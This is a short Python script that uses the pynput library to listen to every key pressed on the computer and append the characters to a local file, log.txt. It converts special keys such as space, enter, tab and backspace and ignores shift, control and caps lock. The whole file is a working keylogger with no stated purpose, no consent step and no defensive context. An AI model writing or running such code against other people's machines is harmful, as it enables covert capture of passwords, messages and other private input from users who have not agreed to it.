from pynput.keyboard import Listener


def write_file(key):

    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = "\n"
    elif letter == 'Key.ctrl_l' or letter == 'Key.shift_r' or letter == 'Key.shift':
        return
    elif letter == 'Key.backspace':
        letter = '\b'
    elif letter == 'Key.caps_lock':
        return
    elif letter == 'Key.tab':
        letter = '\t'
    else:
        letter = letter.replace("Key.", "")
    with open("log.txt",'a') as f:
        f.write(letter)

with Listener(on_press=write_file) as l:
    l.join()
